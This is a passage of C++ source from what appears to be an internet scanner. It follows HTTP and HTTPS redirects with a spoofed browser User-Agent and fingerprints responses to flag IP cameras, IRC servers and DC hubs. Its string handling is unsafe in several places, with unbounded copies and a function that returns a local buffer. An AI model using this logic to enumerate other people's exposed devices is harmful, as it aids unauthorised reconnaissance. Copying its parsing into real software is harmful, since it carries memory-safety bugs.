	const char *buff4 = "\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: us-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nConnection: close\r\n\r\n";

	Connector con;
	char tempIP[MAX_ADDR_LEN] = {0};
	int tempPort = 80;
	char tempPath[1024] = {0};
	char mes[2048]= {0};

	char redirText1[512] = {"[Redirect: ] http://"};
	char redirText2[512] = {"[Redirect: ] \"http://"};
	char redirText3[512] = {"[Redirect: ] 'http://"};
	int redirSize = 0;

	if(strstri(str, redirText1) != NULL) redirSize = strlen(redirText1);
	if(strstri(str, redirText2) != NULL) redirSize = strlen(redirText2);
	if(strstri(str, redirText3) != NULL) redirSize = strlen(redirText3);

	if(strstr(str, "https://") != NULL)
	{
		tempPort = 443;
#pragma region Searcher
		if(strstr(str, "[Redirect: ] ") != NULL) str = (char*)(strstr(str, "[Redirect: ] ") + strlen("[Redirect: ] "));

		if(strstri((char*)(str + strlen("https://")), "/") != NULL) redirSize = strlen(strstri((char*)(str + strlen("https://")), "/"));
		
		if(strstri(strstr(str, "https://") + strlen("https://") + 1, "/") != NULL)	//tempIP search
		{	
			int res1 = strlen(str);
			int res2 = res1;
			char *tempT = strstr(str, "https://");

			char *ptr1 = strstr(str, "https://");
			int sz1 = strlen("https://");

			if(strstri(ptr1 + sz1 + 1, "/") != NULL)
			{
				char *tempT2 = strstr(ptr1 + sz1 + 1, "/");

				res1 = tempT2 - tempT;
			}
			
			if(strstri(ptr1 + sz1 + 1, "?") != NULL)
			{
				char *tempT2 = strstr(ptr1 + sz1 + 1, "?");

				res2 = tempT2 - tempT;
			};

			if(res1 < res2)
			{
				strncpy(tempIP, (char*)(str + sz1), res1 - sz1);				
			}
			else if(res1 > res2)
			{
				strncpy(tempIP, (char*)(str + sz1), res2 - sz1);
			}
			else 
			{
				strncpy(tempIP, str + redirSize, (int)(strlen(str) - redirSize) );	
			};

			if(strstr(ptr1 + sz1 + 1, "')") != NULL)  //JARedirect?
			{
				strncpy(tempIP, str + redirSize + 1,
					(int)(strlen(str) - strlen(strstr(ptr1 + sz1 + 1, "/")) - redirSize) - 1 );
			};
		}
		else if(strstri(strstr(str, "https://") + strlen("https://") + 1, "?") != NULL)
		{
			strncpy(tempIP, str + redirSize,
				strstri(strstr(str, "https://") + strlen("https://"), "?") - str - redirSize );
		}
		else if(strstri(strstr(str, "https://") + strlen("https://") + 1, "\"") != NULL)
		{
			strncpy(tempIP, str + redirSize,
				strstri(strstr(str, "https://") + strlen("https://"), "\"") - str - redirSize );
		}
		else if(strstri(strstr(str, "https://") + strlen("https://") + 1, "\n") != NULL)
		{
			strncpy(tempIP, str + redirSize,
				strstri(strstr(str, "https://") + strlen("https://"), "\n") - str - redirSize );
		}
		else if(strstri(strstr(str, "https://") + strlen("https://") + 1, "')") != NULL)
		{
			strncpy(tempIP, str + redirSize,
				strstri(strstr(str, "https://") + strlen("https://"), "')") - str - redirSize );
		}
		else
		{	
			strcpy(tempIP, strstr(str, "https://") + strlen("https://"));
		};

		char *temp1 = strstr(str, "https://");

		if(strstri(temp1 + strlen("https://") + 1, "/") != NULL)
		{
			char *temp2 = strstri(temp1 + strlen("https://") + 1, "/");
			if( strstri(temp2, "')") )
			{
				strncpy(tempPath, strstri(temp1 + strlen("https://"), "/"), strlen(temp2) - strlen(strstri(temp2, "')")));
			}
			else if( strstri(temp2, "\n") )
			{
				strncpy(tempPath, temp2, strlen(temp2) - strlen(strstri(temp2, "\n")));
			}
			else strcpy(tempPath, temp2);
		}
		else if(strstri(strstr(str, "https://") + strlen("https://") + 1, "?") != NULL)    //Path search
		{
			char *temp2 = strstri(temp1 + strlen("https://") + 1, "?");
			if( strstri(temp2, "')") )
			{
				strncpy(tempPath, strstri(temp1 + strlen("https://"), "?"), strlen(temp2) - strlen(strstri(temp2, "')")));
			}
			else if( strstri(temp2, "\n") )
			{
				strncpy(tempPath, temp2, strlen(temp2) - strlen(strstri(temp2, "\n")));
			}
			else strcpy(tempPath, temp2);
		}
		else strcpy(tempPath, "/");

		if(strstri(tempIP, ":") != NULL)				//Port detected
		{
			char tmpIP[512] = {0};
			strcpy(tmpIP, tempIP);
			ZeroMemory(tempIP, sizeof(tempIP));
			int sz = strlen(tmpIP) - strlen(strstri(tmpIP, ":"));
			strncpy(tempIP, tmpIP, sz);
			tempPort = atoi(strstri(tmpIP, ":") + 1);
		};

#pragma endregion

		if(strlen(tempIP) == 0)
		{
			ps->flag = -1;
			strcpy(ps->headr, "[IGNR_ADDR]");
			strcpy(ps->path, tempPath);
			
			return 0;
		};

		char b[16] = {0};
		strcpy(mes, buff1);

		if(tempPath[0] != '/') strcat(mes, "/");
		strcat(mes, tempPath);
		strcat(mes, buff2);
		strcat(mes, tempIP);
		if(strlen(cookie) != 0)
		{
			strcat(mes, buff3);
			strcat(mes, cookie);
		};
		strcat(mes, buff4);

		char head[TITLE_MAX_LENGTH] = {0};
		
		conSTR cstr;
		cstr.size = 0;
		cstr.lowerBuff = NULL;
		if(con._EstablishSSLConnection(tempIP, tempPort, mes, &cstr) != -1)
		{
			strncpy(buff, cstr.lowerBuff, (cstr.size < 65535 ? cstr.size : 65535));
			strcpy(ps->codepage, GetCodePage(cstr.lowerBuff));


			ls->flag = ContentFilter(cstr.lowerBuff, tempPort, tempIP);
			ps->flag = ls->flag;

			if(ls->flag == -1) 
			{
				ps->flag = -1;
				strcpy(ps->headr, "[IGNR_ADDR]");
				strcpy(ps->path, tempPath);
				delete []cstr.lowerBuff;

				return 0;
			};
			if(ls->flag >= 17 || ls->flag == 11 || ls->flag == 12 
				|| ls->flag == 13 || ls->flag == 14 || ls->flag == 1 || ls->flag == 10) 
			{
				strcat(ps->headr, GetTitle(cstr.lowerBuff));
				ps->flag = ls->flag;
				strcpy(ps->path, tempPath);
				ps->port = tempPort;
				strcpy(ps->ip, tempIP);

				delete []cstr.lowerBuff;

				return ls->flag;
			};
			if(ls->flag == 6)
			{
				ps->flag = ls->flag;
				ps->port = tempPort;
				return ls->flag;			
			};
			ls->_header(tempIP, tempPort, cstr.lowerBuff, ls, ps, redirStrLst, buff);
			if(strlen(cstr.lowerBuff) < 1)
			{
				ps->flag = 3;
				ls->flag = 3;
			}
			else if(strstr(cstr.lowerBuff, "[OVERFLOW]") != NULL) 
			{
				ls->flag = 0;
				ps->flag = 0;
			};

			strcat(ps->headr, " -> ");
			strcat(ps->headr, GetTitle(cstr.lowerBuff));
			ps->port = tempPort;
			delete []cstr.lowerBuff;
		}
		else
		{
			ps->flag = -1;
			ls->flag = -1;
			if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _header::redirect [Dead host].");
		};
		
		return 0;
	}
	else if(strstr(str, "http://") != NULL) //http
	{
#pragma region Searcher
		if(strstr(str, "[Redirect: ] ") != NULL) str = (char*)(strstr(str, "[Redirect: ] ") + strlen("[Redirect: ] "));

		int sz1 = strlen("http://");
		char *ptr1 = strstr(str, "http://");
		if(strstr((char*)(str + sz1), "/") != NULL) redirSize = strlen(strstri((char*)(str + sz1), "/"));
		if(strstr(ptr1 + sz1 + 1, ":") != NULL 
			&& strlen(strstr(ptr1 + sz1 + 1, ":")) > 1 
			&& strstr(ptr1 + sz1 + 1, "http:") == NULL 
			)    //Port search
		{	
			char temp[512] = {0};
			int range = 0;

			char *ptr2 = strstr(ptr1 + sz1, ":");

			if(strstr(ptr2 + 1, "/") != NULL)
			{
				range = strstr(ptr2 + 1, "/") - ptr2 - 1;
				strncpy(temp, ptr2 + 1, range > 512 ? 511 : range);
			}
			else strcpy(temp, ptr2 + 1);

			char *str1 = ptr1;

			tempPort = atoi(temp);
			strncpy(tempIP, ptr1 + sz1, ptr2 - str1 - sz1);
		}
		else if(strstr(ptr1 + sz1 + 1, "/") != NULL)	//tempIP search
		{	
			int res1 = strlen(str);
			int res2 = res1;
			char *tempT = ptr1;
			
			if(strstr(ptr1 + sz1 + 1, "/") != NULL)
			{
				char *tempT2 = strstr(ptr1 + sz1 + 1, "/");

				res1 = tempT2 - tempT;
			}
			
			if(strstr(ptr1 + sz1 + 1, "?") != NULL)
			{
				char *tempT2 = strstr(ptr1 + sz1 + 1, "?");

				res2 = tempT2 - tempT;
			};

			if(res1 < res2)
			{
				strncpy(tempIP, (char*)(str + sz1), res1 - sz1);				
			}
			else if(res1 > res2)
			{
				strncpy(tempIP, (char*)(str + sz1), res2 - sz1);
			}
			else 
			{
				strncpy(tempIP, str + redirSize, (int)(strlen(str) - redirSize) );	
			};

			if(strstr(ptr1 + sz1 + 1, "')") != NULL)  //JARedirect?
			{
				strncpy(tempIP, str + redirSize + 1,
					(int)(strlen(str) - strlen(strstr(ptr1 + sz1 + 1, "/")) - redirSize) - 1 );
			}
			tempPort = port;
		}
		else if(strstr(ptr1 + sz1 + 1, "?") != NULL)
		{
			tempPort = port;
			int szH = strstr(ptr1 + sz1, "?") - str - redirSize - sz1;
			if(szH > 0) strncpy(tempIP, str + redirSize + sz1, szH);
			else strcpy(tempIP, ip);
		}
		else if(strstr(ptr1 + sz1 + 1, "\"") != NULL)
		{
			tempPort = port;
			strncpy(tempIP, str + redirSize + sz1,
				strstr(ptr1 + sz1, "\"") - str - redirSize - sz1);
		}
		else if(strstr(ptr1 + sz1 + 1, "\n") != NULL)
		{
			tempPort = port;
			strncpy(tempIP, str + redirSize + sz1,
				strstr(ptr1 + sz1, "\n") - str - redirSize - sz1);
		}
		else if(strstr(ptr1 + sz1 + 1, "')") != NULL)
		{
			tempPort = port;
			strncpy(tempIP, str + redirSize + sz1,
				strstr(ptr1 + sz1, "')") - str - redirSize - sz1);
		}
		else
		{	
			tempPort = port;
			strcpy(tempIP, ptr1 + sz1);
		};

		char *temp1 = ptr1;

		if(strstr(temp1 + sz1 + 1, "/") != NULL)
		{
			char *temp2 = strstr(temp1 + sz1 + 1, "/");
			if( strstr(temp2, "')") )
			{
				strncpy(tempPath, strstr(temp1 + sz1, "/"), strlen(temp2) - strlen(strstr(temp2, "')")));
			}
			else if( strstr(temp2, "\n") )
			{
				strncpy(tempPath, temp2, strlen(temp2) - strlen(strstr(temp2, "\n")));
			}
			else strcpy(tempPath, temp2);
		}
		else if(strstr(ptr1 + sz1 + 1, "?") != NULL)    //Path search
		{
			char *temp2 = strstr(temp1 + sz1 + 1, "?");
			if( strstr(temp2, "')") )
			{
				strncpy(tempPath, strstr(temp1 + sz1, "?"), strlen(temp2) - strlen(strstr(temp2, "')")));
			}
			else if( strstr(temp2, "\n") )
			{
				strncpy(tempPath, temp2, strlen(temp2) - strlen(strstr(temp2, "\n")));
			}
			else strcpy(tempPath, temp2);
		}
		else strcpy(tempPath, "/");

#pragma endregion

		char b[16] = {0};
		if(tempPort == 0) tempPort = port;
		strcpy(mes, buff1);
		if(tempPath[0] != '/') strcat(mes, "/");
		strcat(mes, tempPath);
		strcat(mes, buff2);
		strcat(mes, tempIP);
		if(strlen(cookie) != 0)
		{
			strcat(mes, buff3);
			strcat(mes, cookie);
		};
		strcat(mes, buff4);
		char head[TITLE_MAX_LENGTH] = {0};
		
		conSTR cstr;
		cstr.size = 0;
		cstr.lowerBuff = NULL;		
		if(con._EstablishConnection(tempIP, tempPort, mes, &cstr) != -1)
		{
			strncpy(buff, cstr.lowerBuff, (cstr.size < 65535 ? cstr.size : 65535));
			strcpy(ps->codepage, GetCodePage(cstr.lowerBuff));


		ls->flag = ContentFilter(cstr.lowerBuff, tempPort, tempIP);
		ps->flag = ls->flag;
		
		if(ls->flag == -1) 
		{
			ps->flag = -1;
			strcpy(ps->headr, "[IGNR_ADDR]");
			strcpy(ps->path, tempPath);
			delete []cstr.lowerBuff;
			
			return -1;
		};
		if(ls->flag >= 17 || ls->flag == 11 || ls->flag == 12 
		|| ls->flag == 13 || ls->flag == 14 || ls->flag == 1 || ls->flag == 10) 
		{
			strcat(ps->headr, GetTitle(cstr.lowerBuff));
			ps->flag = ls->flag;
			strcpy(ps->path, tempPath);
			delete []cstr.lowerBuff;
			ps->port = tempPort;
			strcpy(ps->ip, tempIP);
			
			return ls->flag;
		};
		if(ls->flag == 6)
		{
			ps->flag = ls->flag;
			ps->port = tempPort;
			return ls->flag;			
		};
		ls->_header(tempIP, tempPort, cstr.lowerBuff, ls, ps, redirStrLst, buff);
		
		if(strlen(cstr.lowerBuff) < 1)
		{
			ps->flag = 3;
			ls->flag = 3;
		}
		else if(strstr(cstr.lowerBuff, "[OVERFLOW]") != NULL) 
		{
			ls->flag = 0;
			ps->flag = 0;
		};
				
			strcat(ps->headr, " -> ");
			strcat(ps->headr, GetTitle(cstr.lowerBuff));
			delete []cstr.lowerBuff;		
			ps->port = tempPort;
		}
		else
		{
			ps->flag = -1;
			ls->flag = -1;
			if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _header::redirect [Dead host].");
		};
		return 0;
	}
	else if(str[0] == '/' || (str[0] == '.' && str[1] == '/') || (str[0] == '.' && str[1] == '.' && str[2] == '/'))
	{
		char *ptr1 = strstr(str, "/");
		if( strstr(str, "')" ) )
		{
			strncpy(tempPath, ptr1, strlen(ptr1) - strlen(strstr(ptr1, "')")));
		}
		else if( strstr(str, "\"") )
		{
			strncpy(tempPath, ptr1, strstr(str, "\"") - str);
		}
		else if( strstr(str, "\n") )
		{
			strncpy(tempPath, ptr1, strlen(ptr1) - strlen(strstr(ptr1, "\n")));
		}
		else 
		{ 
			if(strstr(str, "[Redirect: ]") != NULL) strcpy(tempPath, str + strlen("[Redirect: ]"));
			else if(str[0] == '.' && str[1] == '.') strcpy(tempPath, str + 2);
			else if(str[0] == '.') strcpy(tempPath, str + 1);
			else strcpy(tempPath, str);
		};

		char b[16] = {0};
		strcpy(mes, buff1);
		if(tempPath[0] != '/') strcat(mes, "/");
		strcat(mes, tempPath);
		strcat(mes, buff2);
		strcat(mes, ip);
		if(strlen(cookie) != 0)
		{
			strcat(mes, buff3);
			strcat(mes, cookie);
		};
		strcat(mes, buff4);

		char head[TITLE_MAX_LENGTH] = {0};

		conSTR cstr;
		cstr.size = 0;
		cstr.lowerBuff = NULL;
		int cRes = 0;
		if(port == 443) cRes = con._EstablishSSLConnection(ip, 443, mes, &cstr);
		else cRes = con._EstablishConnection(ip, port, mes, &cstr);
			if(cstr.size < 65535)
			{
				strncpy(buff, cstr.lowerBuff, cstr.size);
			}
			else
			{
				strncpy(buff, cstr.lowerBuff, 65535);
			};
		if(cRes != -1)
		{
		strcpy(ps->codepage, GetCodePage(cstr.lowerBuff));
		
		ls->flag = ContentFilter(cstr.lowerBuff, port, ip);
		ps->flag = ls->flag;
		
		if(ls->flag == -1) 
		{
			ps->flag = -1;
			strcpy(ps->headr, "[IGNR_ADDR]");
			strcpy(ps->path, tempPath);
			delete []cstr.lowerBuff;
			
			return -2;
		};
		if(ls->flag >= 17 || ls->flag == 11 || ls->flag == 12 
		|| ls->flag == 13 || ls->flag == 14 || ls->flag == 1 || ls->flag == 10) 
		{
			strcat(ps->headr, GetTitle(cstr.lowerBuff));
			ps->flag = ls->flag;
			strcpy(ps->path, tempPath);
			delete []cstr.lowerBuff;
			ps->port = port;
			strcpy(ps->ip, ip);
			
			return ls->flag;
		};
		if(ls->flag == 6)
		{
			ps->flag = ls->flag;
			ps->port = tempPort;
			return ls->flag;			
		};
		ls->_header(ip, port, cstr.lowerBuff, ls, ps, redirStrLst, buff);
		if(strlen(cstr.lowerBuff) < 1)
		{
			ps->flag = 3;
			ls->flag = 3;
		}
		else if(strstr(cstr.lowerBuff, "[OVERFLOW]") != NULL) 
		{
			ls->flag = 0;
			ps->flag = 0;
		};
	
		strcat(ps->headr, "->");
		strcat(ps->headr, GetTitle(cstr.lowerBuff));
		delete []cstr.lowerBuff;
			ps->port = tempPort;
		}
		else
		{
			ps->flag = -1;
			ls->flag = -1;
			if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _header::redirect [Dead host].");
		};
		return 0;
	}
	else if(strlen(str) > 2)
	{
		if(strstr(str, "[Redirect: ]") != NULL)
		{
			if((strlen(strstr(str, "]") + 2)) > 4) strncpy(tempPath, strstr(str, "]") + 2, strlen(strstr(str, "]") + 1) - 1); //From "[Redirect: ]"
			else 
			{
				strcpy(ps->headr, "[Error in redirect.]");
				strcpy(ps->path, "/");

				return 0;
			}
		}
		else strcpy(tempPath, str);

		strcpy(mes, buff1);
		if(tempPath[0] != '/') strcat(mes, "/");
		strcat(mes, tempPath);
		strcat(mes, buff2);
		strcat(mes, ip);
		if(strlen(cookie) != 0)
		{
			strcat(mes, buff3);
			strcat(mes, cookie);
		};
		strcat(mes, buff4);

		char head[TITLE_MAX_LENGTH] = {0};
		
		conSTR cstr;
		cstr.size = 0;
		cstr.lowerBuff = NULL;
		if(con._EstablishConnection(ip, port, mes, &cstr) != -1)
		{
			strncpy(buff, cstr.lowerBuff, (cstr.size < 65535 ? cstr.size : 65535));
			strcpy(ps->codepage, GetCodePage(cstr.lowerBuff));

			ls->flag = ContentFilter(cstr.lowerBuff, port, ip);
			ps->flag = ls->flag;
			if(ls->flag == -1) 
			{
				ps->flag = -1;
				strcpy(ps->headr, "[IGNR_ADDR]");
				strcpy(ps->path, tempPath);
				delete []cstr.lowerBuff;

				return -1;
			};
			if(ls->flag >= 17 || ls->flag == 11 || ls->flag == 12 
				|| ls->flag == 13 || ls->flag == 14 || ls->flag == 1 || ls->flag == 10) 
			{
				strcat(ps->headr, GetTitle(cstr.lowerBuff));
				ps->flag = ls->flag;
				strcpy(ps->path, tempPath);
				delete []cstr.lowerBuff;
				ps->port = port;
				strcpy(ps->ip, ip);

				return ls->flag;
			};
		if(ls->flag == 6)
		{
			ps->flag = ls->flag;
			ps->port = tempPort;
			return ls->flag;			
		};
			ls->_header(ip, port, cstr.lowerBuff, ls, ps, redirStrLst, buff);

			if(strlen(cstr.lowerBuff) < 1)
			{
				ps->flag = 3;
				ls->flag = 3;
			}
			else if(strstr(cstr.lowerBuff, "[OVERFLOW]") != NULL) 
			{
				ls->flag = 0;
				ps->flag = 0;
			};

			strcat(ps->headr, " -> ");
			strcat(ps->headr, GetTitle(cstr.lowerBuff));
			delete []cstr.lowerBuff;
			ps->port = tempPort;
		}
		else
		{
			ps->flag = -1;
			ls->flag = -1;
			if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _header::redirect [Dead host].");
		};
		return 0;
	};
		
	return -1;
};
char *_ValidateRedStr(char *str, char *oldResStr)
{
	char toldResStr[512] = {0};
	strcat(toldResStr, " ");
	strncat(toldResStr, oldResStr, 510);
	char *temp1 = strstr(str, toldResStr);
	char redStr[512] = {0};
	if(temp1 != NULL)
	{
		char *temp2 = FindFirstOcc(temp1 + 1, "\"'");
		char *temp3 = FindFirstOcc(temp2 + 1, ";\n");
		int sz = temp3 - temp2 - 2;
		char tRedStr[512] = {0};
		sz = (sz < 0?0:sz);
		strncpy(tRedStr, temp2 + 1, (sz < 511 ? sz : 511));

		if(strstr(tRedStr, "+") != NULL)
		{
			int iC = 0;
			for(int i = 0; i < sz; ++i)
			{
				if(tRedStr[i] != '+' && tRedStr[i] != '"' && tRedStr[i] != '\'' && tRedStr[i] != ';' && tRedStr[i] != '\n' && tRedStr[i] != ' ') 
				{
					redStr[iC] = tRedStr[i];
					++iC;
				};
			};
		} else strcpy(redStr, tRedStr);
	};
	return redStr;
};

void _getPopupTitle(PathStr *ps, char *str)
{
	char res[32] = {0};

	strcat(ps->headr, "[Popup detected. Title: "); 				

	char *ptr1 = strstr(str, ",");
	if(ptr1 != NULL)
	{
		char *ptr2 = strstr(ptr1 + 1, ",");
		if(ptr2 != NULL)
		{
			int sz = ptr2 - ptr1 - 1;
			if(sz >= 32) sz = 32;
			
			strncat(ps->headr, ptr1 + 1, sz < 32 ? sz : 32);
		}
		else
		{
			strcat(ps->headr, "[BOUNDARY_ERROR]");
		};
	}
	else
	{
		strcat(ps->headr, "[BOUNDARY_ERROR]");
	};

	strcat(ps->headr, "]"); 
};

int Lexems::_header(char *ip, int port, char str[], Lexems *l, PathStr *ps, std::vector<std::string> *redirStrLst, char *rBuff)
{
	std::string redirectStr = "";
	char cookie[1024] = {0};
	strncpy(cookie, _getAttribute(str, "Set-Cookie:"), 1024);


#pragma region Prechecks
	if(strstr(str, "[IGNR_ADDR]") != NULL) 
	{
		if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _header::Precheck.");
		strcpy(ps->headr, "[IGNR_ADDR]"); 
		strcpy(ps->path, "/"); 
		return 0; 
	};

	strcpy(ps->codepage, GetCodePage(str));

	if(strstr(str, "[CONN_LOWLOAD_OMG]") != NULL) 
	{
		strcpy(ps->headr, "[CONN_LOWLOAD_OMG]"); 
		strcpy(ps->path, "/"); 
		return 0; 
	};

	if(strlen(str) == 0)
	{
		strcpy(ps->headr, "[No data!]");  
		strcpy(ps->path, "/"); 
		return 0;
	};

	char *secondStr, *firstStr, *tempStr, finalstr[512] = {0};
	
	if(strstri(str, "notice auth :*** looking up your hostname...") || strstri(str, "451 * :You have not registered.")) { strcpy(ps->headr, "[IRC server]"); strcpy(ps->path, "/");  return 1; };
	if(strstri(str, "Error - Bad Address")) { strcpy(ps->headr, str); strcpy(ps->path, "/");  return 0; };
	if(strstri(str, "[OVERFLOW]") != NULL) { strcpy(ps->headr, "[OVERFLOW]"); strcpy(ps->path, "/");  return 0; };
	if(strstri(str, "site introuvable !") != NULL) { strcpy(ps->headr, "[Site introuvable !]"); strcpy(ps->path, "/");  return 0; };
	if(strstri(str, "ip camera") != NULL || strstri(str, "+tm01+") != NULL 
		|| strstri(str, "camera web server") != NULL	|| strstri(str, "ipcam_language") != NULL
		|| strstri(str, "/viewer/video.jpg") != NULL	|| strstri(str, "network camera") != NULL
		|| strstri(str, "sanpshot_icon") != NULL		|| strstri(str, "snapshot_icon") != NULL
		|| strstri(str, "lan camera") != NULL			|| strstri(str, "cgiuserlogin?") != NULL
		|| strstri(str, "web camera") != NULL			|| strstri(str, "smart ip device") != NULL
		|| strstri(str, "pan/tilt camera") != NULL		|| strstri(str, "/cgi-bin/viewer/getparam.cgi?") != NULL
		|| strstri(str, "IPCamera") != NULL		
		
		) 
	{ 
		strcpy(ps->headr, "[IP Camera detected.]");
		l->flag = 0;
		ps->flag = 0;
	};
	if(strstri(str, "get_status.cgi") != NULL) { strcpy(ps->headr, "[It may be ip camera]"); };
	if(strstri(str, "vo_logo.gif") != NULL || strstri(str, "vo logo.gif") != NULL) { strcpy(ps->headr, "[VIVOTEK camera detected?]"); };
	if(strstri(str, "$lock extended") != NULL) { strcpy(ps->headr, "[DChub detected.]"); strcpy(ps->path, "/");  return 0; };
	if(strstri(str, "top.htm?currenttime") != NULL || strstri(str, "top.htm?") != NULL) strcat(finalstr, " [?][SecCam detected]");
#pragma endregion
	
#pragma region 302 Redirects
	if(strstri(str, "301 found") != NULL || strstri(str, "302 found") != NULL || 
		strstri(str, "redirect") != NULL  || strstri(str, "303 see other") != NULL ||
		strstri(str, "302 document follows") != NULL || strstri(str, "301 moved") != NULL || strstri(str, "302 moved") != NULL ||
		strstri(str, "302 redirect") != NULL || strstri(str, "301 redirect") != NULL || 
		strstri(str, "http/1.1 302 ") != NULL || strstri(str, "http/1.0 302 ") != NULL)
	{	
		char *temp, *temp2;
		int res = 0;

		if(strstri(str, "location: ") != NULL)
		{
			temp = strstri(str, "location: ");

			if( strstr(temp+strlen("location: "), "\r\n") != NULL ) 
			{
				temp2 = strstri(temp + strlen("location: "), "\r\n");
				res = temp2 - temp;
			} 
			else if( strstr(temp+strlen("location: "), "\n") != NULL ) 
			{ 
				temp2 = strstr(temp + strlen("location: "), "\n");
				res = temp2 - temp;
			} else res = 600;

			char newLocN[512] = {0};
			char *tmp = {0};
			if(strstri(temp, "/") != NULL) tmp = strstr(temp, "/");
			if(res > 512) strncat(newLocN, temp + strlen("location: "), 512);
			else strncat(newLocN, temp + strlen("location: "), res - strlen("location: "));
			
			if(strstr(newLocN, "http://") == NULL && strstr(newLocN, "https://") == NULL)
			{
				if(newLocN[0] != '.')
				{
					if(newLocN[0] != '/')
					{
						char tnewLocN[512] = {0};
						strcpy(tnewLocN, "/");
						strcat(tnewLocN, newLocN);
						strcpy(newLocN, tnewLocN);
					};
				};
			};
			
			redirectStr = std::string(newLocN);
			if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
			{
				redirStrLst->push_back(redirectStr);
				redirectReconnect(cookie, ip, port, newLocN, l, ps, redirStrLst, rBuff);
			};
			return -2;
		}
		else if(strstri(str, "location:") != NULL)
		{
			temp = strstri(str, "location:");

			if( strstri(temp+strlen("location:"), "\r\n") != NULL ) 
			{
				temp2 = strstri(temp + strlen("location:"), "\r\n");
				res = temp2 - temp;
			} 
			else if( strstri(temp+strlen("location:"), "\n") != NULL ) 
			{ 
				temp2 = strstri(temp + strlen("location:"), "\n");
				res = temp2 - temp;
			} else res = 600;

			char newLoc[512] = {0};
			char *tmp = {0};
			if(strstri(temp, "/") != NULL) tmp = strstri(temp, "/");
			if(res > 512) strncat(newLoc, temp+strlen("location:"), 512);
			else strncat(newLoc, temp + strlen("location:"), res - strlen("location:"));

			redirectStr = std::string(newLoc);
			if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
			{
				redirStrLst->push_back(redirectStr);
				redirectReconnect(cookie, ip, port, newLoc, l, ps, redirStrLst, rBuff);
			};
			return -2;
		};
	};

	if( strstri(str, "see other") != NULL 
		|| strstri(str, "object moved") != NULL || strstri(str, "moved temporarily") != NULL
		|| strstri(str, "moved permanently") != NULL )
	{
		char *temp;

		if(strstri(str, "location=") != NULL) 
		{
			temp = strstri(str, "location=");
			char *temp2 = strstri(temp+strlen("location="), ">");
			int res = temp2 - temp;
			char lol[512] = {0};

			strncpy(lol, "[Redirect: ] ", strlen("[Redirect: ] "));
			strncat(lol, temp+strlen("location="), res - strlen("location="));

			redirectStr = std::string(lol);
			if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
			{
				redirStrLst->push_back(redirectStr);
				redirectReconnect(cookie, ip, port, lol, l, ps, redirStrLst, rBuff);
			};
			return -2;
		}
		else if(strstri(str, "location:") != NULL) 
		{
			temp = strstri(str, "location:");
			char *temp2;
			if(strstri(temp+strlen("location:"), "\r\n") != 0) {temp2 = strstri(temp+strlen("location:"), "\r\n"); 
			}
			else if(strstri(temp+strlen("location:"), "\r\n\r\n\n") != 0) temp2 = strstri(temp+strlen("location:"), "\r\n\r\n\n"); 
			else if(strstri(temp+strlen("location:"), "\n") != 0) {temp2 = strstri(temp+strlen("location:"), "\n"); 
			}
			else if(strstri(temp+strlen("content-length"), "\n") != 0) temp2 = strstri(temp+strlen("content-length"), "\n"); 
			else if(strstri(temp+strlen("location: "), " ") != 0) temp2 = strstri(temp+strlen("location: "), " "); 
			else temp2 = strstri(temp+strlen("location:"), "server");
			int res = temp2 - temp;
			char lol[512] = {0};		

			strncpy(lol, "[Redirect: ] ", strlen("[Redirect: ]"));
			int sum = res - strlen("location:");
			if(sum > sizeof(lol)) sum = 20;
			strncat(lol, temp+strlen("location:"), sum);

			redirectStr = std::string(lol);
			if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
			{
				redirStrLst->push_back(redirectStr);
				redirectReconnect(cookie, ip, port, lol, l, ps, redirStrLst, rBuff);
			};
			return -2;
		};
	};
	if(strstri(str, "http-equiv=\"refresh\"") != NULL || strstri(str, "http-equiv=refresh") != NULL || strstri(str, "http-equiv='refresh'") != NULL)
	{
		char *temp = NULL;
		char *strTmp = NULL;

		if(strstri(str, "http-equiv=\"refresh\"") != NULL) strTmp = strstri(str, "ttp-equiv=\"refresh\"");
		else if(strstri(str, "http-equiv=refresh") != NULL) strTmp = strstri(str, "http-equiv=refresh");
		else if(strstri(str, "http-equiv='refresh'") != NULL) strTmp = strstri(str, "http-equiv='refresh'");
		
		if(strstri(strTmp, "url=") != NULL )
		{
			if((int)(strstri(strTmp, "url=") - strTmp) < 100)
			{
				temp = strstri(strTmp, "url=");

				char *temp1 = 0, *temp2 = 0, temp3[512] = {0}; 
				int sz = 0;

				if(temp[4] == '"' || temp[4] == '\'' || temp[4] == ' ' || temp[4] == '\n' || temp[4] == '\r')
				{
					temp2 = FindFirstOcc(temp + 6, " \n>\"'");
					sz = (int)(temp2 - temp) - 5;
					strncpy(temp3, (char*)(temp + 5), (sz < 128 ? sz : 128));
				}
				else 
				{
					temp2 = FindFirstOcc(temp + 4, " \n>\"'");
					sz = (int)(temp2 - temp) - 4;
